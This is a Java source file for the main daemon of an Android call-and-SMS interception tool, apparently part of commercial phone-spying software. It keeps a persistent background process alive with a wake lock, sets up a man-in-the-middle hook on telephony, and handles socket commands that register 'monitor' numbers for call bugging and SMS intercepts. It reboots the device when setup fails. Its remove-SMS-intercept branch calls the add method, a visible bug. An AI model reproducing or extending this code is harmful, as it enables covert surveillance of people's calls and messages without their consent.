package com.vvt.callmanager;

import java.util.HashMap;

import android.content.Context;
import android.os.Looper;
import android.os.PowerManager;
import android.os.PowerManager.WakeLock;
import android.os.SystemClock;

import com.fx.daemon.DaemonHelper;
import com.fx.daemon.util.CrashReporter;
import com.fx.socket.RemoteCheckAlive;
import com.fx.socket.RemoteCheckSync;
import com.fx.socket.RemoteSetSync;
import com.fx.socket.SocketCmd;
import com.fx.socket.SocketCmdServer;
import com.fx.socket.RemoteSetSync.SyncData;
import com.vvt.callmanager.mitm.MitmManager;
import com.vvt.callmanager.ref.BugDaemonResource;
import com.vvt.callmanager.ref.BugNotification;
import com.vvt.callmanager.ref.Customization;
import com.vvt.callmanager.ref.MonitorList;
import com.vvt.callmanager.ref.MonitorNumber;
import com.vvt.callmanager.ref.SmsInterceptInfo;
import com.vvt.callmanager.ref.SmsInterceptList;
import com.vvt.callmanager.ref.command.RemoteAddMonitor;
import com.vvt.callmanager.ref.command.RemoteAddSmsIntercept;
import com.vvt.callmanager.ref.command.RemoteGetMonitorList;
import com.vvt.callmanager.ref.command.RemoteGetSmsInterceptList;
import com.vvt.callmanager.ref.command.RemoteListenBugNotification;
import com.vvt.callmanager.ref.command.RemoteRemoveAllMonitor;
import com.vvt.callmanager.ref.command.RemoteRemoveAllSmsIntercept;
import com.vvt.callmanager.ref.command.RemoteRemoveMonitor;
import com.vvt.callmanager.ref.command.RemoteRemoveSmsIntercept;
import com.vvt.callmanager.security.FxConfigReader;
import com.vvt.logger.FxLog;
import com.vvt.shell.ShellUtil;

public class CallMgrDaemonMain {
	
	private static final String TAG = "CallMgrDaemonMain";
	
	private static final boolean LOGV = Customization.VERBOSE;
	private static final boolean LOGD = Customization.DEBUG;
	private static final boolean LOGE = Customization.ERROR;

	private static CallMgrPreference sPreference;
	private static Context sContext;
	private static HashMap<String, SyncData> sSyncMap;
	private static MitmManager sMitmManager;
	private static SocketCmdServer sSocketCmdServer;
	private static WakeLock sWakeLock;

	public static void main(String[] args) {
		Thread.setDefaultUncaughtExceptionHandler(new CrashReporter(TAG));
		
		DaemonHelper.initLog(
				BugDaemonResource.LOG_FOLDER, 
				BugDaemonResource.LOG_FILENAME);
		
		if (LOGD) FxLog.d(TAG, "main # ENTER ...");
		
		String processName = BugDaemonResource.CallMgr.PROCESS_NAME;
		if (ShellUtil.isProcessRunning(processName)) {
			if (LOGD) FxLog.d(TAG, "initialize # Daemon is already running!");
			ShellUtil.killSelf();
			return;
		}
		
		DaemonHelper.setProcessName(processName);
		
		if (LOGD) FxLog.d(TAG, "main # Waiting until the system is ready ...");
		DaemonHelper.waitSystemReady();
		
		if (LOGD) FxLog.d(TAG, "main # Looper.prepare()");
		Looper.prepare();
		
		if (LOGD) FxLog.d(TAG, "main # Create system context");
    	sContext = DaemonHelper.getSystemContext();
    	if (sContext == null) {
			if (LOGE) FxLog.e(TAG, "main # Create SystemContext FAILED!! -> EXIT");
			ShellUtil.killSelf();
			return;
		}
    	
    	if (LOGD) FxLog.d(TAG, "main # Validate dex zip file ...");
		boolean isDexFileValid = FxConfigReader.isBugdValid(
				String.format("%s/%s", 
						BugDaemonResource.EXTRACTING_PATH, 
						BugDaemonResource.DEX_ZIP_FILENAME), 
				String.format("%s/%s", 
						BugDaemonResource.EXTRACTING_PATH, 
						BugDaemonResource.SECURITY_CONFIG_FILE));
		if (! isDexFileValid) {
			if (LOGE) FxLog.e(TAG, "main # Validation FAILED!!");
			ShellUtil.killSelf();
			return;
		}
    	
    	if (acquireWakeLock(sContext)) {
			if (LOGD) FxLog.d(TAG, "main # PARTIAL_WAKE_LOCK acquired!");
		}
		else {
			if (LOGE) FxLog.e(TAG, "main # Acquire WakeLock FAILED!!");
			ShellUtil.killSelf();
			return;
		}
		
    	if (LOGD) FxLog.d(TAG, "main # Prepare server socket ...");
    	boolean isServerSocketCreated = prepareServerSocket();
    	if (! isServerSocketCreated) {
    		if (LOGE) FxLog.e(TAG, "main # Create server socket FAILED!!");
			ShellUtil.killSelf();
			return;
    	}

		if (LOGD) FxLog.d(TAG, "main # Setup mitm");
		sMitmManager = MitmManager.getInstance(sContext);
		sMitmManager.setupMitm();
		
		if (LOGD) FxLog.d(TAG, "main # Notify MITM setup complete in 3 sec ...");
		SystemClock.sleep(3000);
		notifyMitmSetupSuccess();
		
		if (LOGD) FxLog.d(TAG, "main # Looper.loop()");
		Looper.loop();
		
		if (LOGD) FxLog.d(TAG, "main # EXIT ...");
	}
	
	private static void notifyMitmSetupSuccess() {
		sContext.getContentResolver().notifyChange(
				BugDaemonResource.URI_MITM_SETUP_SUCCESS, null);
	}
	
	private static boolean acquireWakeLock(Context context) {
		PowerManager powerManager = 
				(PowerManager) context.getSystemService(Context.POWER_SERVICE);
		
		if (sWakeLock == null || !sWakeLock.isHeld()) {
			sWakeLock = powerManager.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, TAG);
			sWakeLock.acquire();
		}
		
		return sWakeLock != null && sWakeLock.isHeld();
	}

	private static boolean prepareServerSocket() {
		if (LOGV) FxLog.v(TAG, "prepareServerSocket # ENTER ...");
		
		boolean isSuccess = false;
		
		try {
			sSocketCmdServer = new SocketCmdServer(TAG, BugDaemonResource.CallMgr.SOCKET_NAME) {
				@Override
				public Object process(SocketCmd<?, ?> command) {
					return processCommand(command);
				}
			};
			sSocketCmdServer.start();
			isSuccess = true;
		}
		catch (Exception e) {
			if (LOGE) FxLog.e(TAG, String.format("prepareServerSocket # Error: %s", e));
			if (LOGE) FxLog.e(TAG, "prepareServerSocket # Reboot system ...");
			DaemonHelper.rebootDevice(sContext);
		}
		
		if (LOGV) FxLog.v(TAG, "prepareServerSocket # EXIT ...");
		return isSuccess;
	}
	
	private static Object processCommand(SocketCmd<?, ?> command) {
		if (LOGV) FxLog.v(TAG, "processCommand # ENTER ...");
		
		if (sPreference == null) {
			sPreference = CallMgrPreference.getInstance();
		}
		
		Object response = null;
		
		if (command instanceof RemoteCheckAlive) {
			if (LOGV) FxLog.v(TAG, "processCommand # Check alive");
			response = true;
		}
		else if (command instanceof RemoteCheckSync) {
			if (LOGV) FxLog.v(TAG, "processCommand # Check sync");
			String clientPkg = ((RemoteCheckSync) command).getData();
			response = (boolean) (sSyncMap != null && sSyncMap.keySet().contains(clientPkg));
		}
		else if (command instanceof RemoteSetSync) {
			if (LOGV) FxLog.v(TAG, "processCommand # Set sync");
			SyncData syncData = ((RemoteSetSync) command).getData();
			response = addSyncPackage(syncData.getClientPackage(), syncData);
		}
		else if (command instanceof RemoteAddMonitor) {
			if (LOGD) FxLog.d(TAG, "processCommand # Add monitor");
			
			MonitorNumber monitor = ((RemoteAddMonitor) command).getData();
			if (LOGD) FxLog.d(TAG, String.format("processCommand # Monitor: %s", monitor));
			
			response = sPreference.addMonitor(monitor);
			if (LOGD) FxLog.d(TAG, String.format("processCommand # Success? %s", response));
		}
		else if (command instanceof RemoteRemoveMonitor) {
			if (LOGD) FxLog.d(TAG, "processCommand # Remove monitor");
			
			MonitorNumber monitor = ((RemoteRemoveMonitor) command).getData();
			if (LOGD) FxLog.d(TAG, String.format("processCommand # Monitor: %s", monitor));
			
			response = sPreference.removeMonitor(monitor);
			if (LOGD) FxLog.d(TAG, String.format("processCommand # Success? %s", response));
		}
		else if (command instanceof RemoteRemoveAllMonitor) {
			if (LOGD) FxLog.d(TAG, "processCommand # Remove all monitor ");
			
			String ownerPackage = ((RemoteRemoveAllMonitor) command).getData();
			if (LOGD) FxLog.d(TAG, String.format("processCommand # Owner package: %s", ownerPackage));
			
			response = sPreference.removeAllMonitor(ownerPackage);
			if (LOGD) FxLog.d(TAG, "processCommand # All monitor are removed");
		}
		else if (command instanceof RemoteGetMonitorList) {
			if (LOGD) FxLog.d(TAG, "processCommand # Get monitor list");

			String ownerPackage = ((RemoteGetMonitorList) command).getData();
			if (LOGD) FxLog.d(TAG, String.format("processCommand # Owner package: %s", ownerPackage));
			
			MonitorList monitorList = sPreference.getMonitors(ownerPackage);
			if (LOGD) FxLog.d(TAG, String.format("processCommand # Monitor list=%s", monitorList));
			
			response = monitorList;
		}
		else if (command instanceof RemoteAddSmsIntercept) {
			if (LOGD) FxLog.d(TAG, "processCommand # Add SmsIntercept");
			
			SmsInterceptInfo info = ((RemoteAddSmsIntercept) command).getData();
			if (LOGD) FxLog.d(TAG, String.format("processCommand # SmsInfo: %s", info));
			
			response = sPreference.addSmsIntercept(info);
			if (LOGD) FxLog.d(TAG, String.format("processCommand # Success? %s", response));
		}
		else if (command instanceof RemoteRemoveSmsIntercept) {
			if (LOGD) FxLog.d(TAG, "processCommand # Remove SmsIntercept");
			
			SmsInterceptInfo info = ((RemoteRemoveSmsIntercept) command).getData();
			if (LOGD) FxLog.d(TAG, String.format("processCommand # SmsInfo: %s", info));
			
			response = sPreference.addSmsIntercept(info);
			if (LOGD) FxLog.d(TAG, String.format("processCommand # Success? %s", response));
		}
		else if (command instanceof RemoteRemoveAllSmsIntercept) {
			if (LOGD) FxLog.d(TAG, "processCommand # Remove all SmsIntercept ");
			
			String ownerPackage = ((RemoteRemoveAllSmsIntercept) command).getData();
			if (LOGD) FxLog.d(TAG, String.format("processCommand # Owner package: %s", ownerPackage));
			
			response = sPreference.removeAllSmsIntercept(ownerPackage);
			if (LOGD) FxLog.d(TAG, "processCommand # All SmsIntercept are removed");
		}
		else if (command instanceof RemoteGetSmsInterceptList) {
			if (LOGD) FxLog.d(TAG, "processCommand # Get SmsIntercept list");

			String ownerPackage = ((RemoteGetSmsInterceptList) command).getData();
			if (LOGD) FxLog.d(TAG, String.format("processCommand # Owner package: %s", ownerPackage));
			
			SmsInterceptList list = sPreference.getSmsInterceptList(ownerPackage);
			if (LOGD) FxLog.d(TAG, String.format("processCommand # SmsIntercept list=%s", list));
			
			response = list;
		}
		else if (command instanceof RemoteListenBugNotification) {
			if (LOGD) FxLog.d(TAG, "processCommand # Listen Bug Notification");
			
			BugNotification notification = ((RemoteListenBugNotification) command).getData();
			if (LOGD) FxLog.d(TAG, String.format("processCommand # BugNotification=%s", notification));
			
			response = sPreference.addBugNotifications(notification);
			
		}
		
		if (LOGV) FxLog.v(TAG, "processCommand # EXIT ...");
		return response;
	}
	
	private static boolean addSyncPackage(String clientPkg, SyncData syncData) {
		if (sSyncMap == null) {
			sSyncMap = new HashMap<String, SyncData>();
		}
		return sSyncMap.put(clientPkg, syncData) == null;
	}
	
}
